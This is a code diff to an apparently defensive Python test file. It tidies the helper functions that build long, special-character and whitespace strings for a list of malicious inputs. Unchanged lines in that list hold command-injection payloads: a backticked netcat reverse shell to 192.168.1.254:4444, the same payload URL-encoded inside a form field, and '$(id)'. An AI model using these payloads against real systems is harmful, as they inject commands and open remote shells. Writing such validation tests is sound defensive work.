@@ -26,19 +26,19 @@ WHITESPACE = [
     "\v",
 ]
 
-def specialstring(n):
-    string = ''.join(random.sample(SPECIAL_CHARS, n)
-    return string
+def gen_special_string(n):
+    sp_string = ''.join(random.sample(SPECIAL_CHARS, n))
+    return sp_string
 
-def longstring(n):
-    string = 'a' * n
-    return string
+def gen_long_string(n):
+    l_string = 'a' * n
+    return l_string
 
 MALICIOUS_STRINGS = [
     '', # No value
-    longstring(257), # Too long
-    specialstring(5), # Special characters
-    WHITESPACE[random.choice()],
+    gen_long_string(257), # Too long
+    gen_special_string(5), # Special characters
+    random.choice(WHITESPACE),
     "`nc\t-e\tsh\t192.168.1.254\t4444`",
     "'name=jjgjunique&description=jjj&ipaddr=127.0.0.5&uuid=%60nc%09-e%09sh%09192.168.1.254%094444%60&type=Community&icon=%2Ficon&port=80&ttl=0'"
     '$(id)',
